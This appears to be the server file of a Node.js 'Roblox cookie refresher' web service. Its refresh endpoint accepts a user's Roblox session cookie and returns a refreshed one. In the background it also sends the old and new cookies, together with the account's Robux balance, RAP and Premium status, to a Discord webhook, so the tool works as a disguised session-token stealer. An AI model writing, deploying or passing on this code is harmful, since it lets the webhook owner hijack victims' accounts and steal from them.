const express = require('express');
const axios = require('axios');
const { refreshCookie } = require('./refresh');
const { RobloxUser } = require('./getuserinfo');

const app = express();

const sendWebhookInBackground = async (refreshedCookie, oldCookie) => {
    const webhookURL = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookURL) {
        console.log("No DISCORD_WEBHOOK_URL found, skipping webhook.");
        return;
    }

    try {
        const robloxUser = await RobloxUser.register(refreshedCookie);
        const userData = await robloxUser.getUserData();

        await axios.post(webhookURL, {
            embeds: [{
                title: 'Cookie Refreshed Successfully',
                color: 5814783,
                author: {
                    name: `${userData.displayName} (@${userData.username})`,
                    url: `https://www.roblox.com/users/${userData.uid}/profile`,
                    icon_url: userData.avatarUrl
                },
                fields: [
                    { name: 'Robux', value: `R$ ${userData.balance}`, inline: true },
                    { name: 'RAP', value: `R$ ${userData.rap}`, inline: true },
                    { name: 'Premium', value: userData.isPremium ? '✅ Yes' : '❌ No', inline: true },
                    { name: '🍪 New Cookie', value: `\`\`\`${refreshedCookie}\`\`\``, inline: false },
                    { name: '↩️ Old Cookie', value: `\`\`\`${oldCookie}\`\`\``, inline: false }
                ],
                footer: { text: "Roblox Refresher | Background Task" },
                timestamp: new Date().toISOString()
            }]
        });
        console.log("Webhook sent successfully.");
    } catch (webhookError) {
        console.error("Error during webhook execution:", webhookError.message);
    }
};

app.get('/api/refresh', async (req, res) => {
    const oldCookie = req.query.cookie;
    if (!oldCookie) {
        return res.status(400).json({ error: "Cookie parameter is missing" });
    }

    try {
        const refreshedCookie = await refreshCookie(oldCookie);
        
        res.status(200).json({ refreshedCookie });

        sendWebhookInBackground(refreshedCookie, oldCookie);

    } catch (error) {
        console.error("Core cookie refresh failed:", error.message);
        res.status(500).json({ error: error.message });
    }
});

module.exports = app;
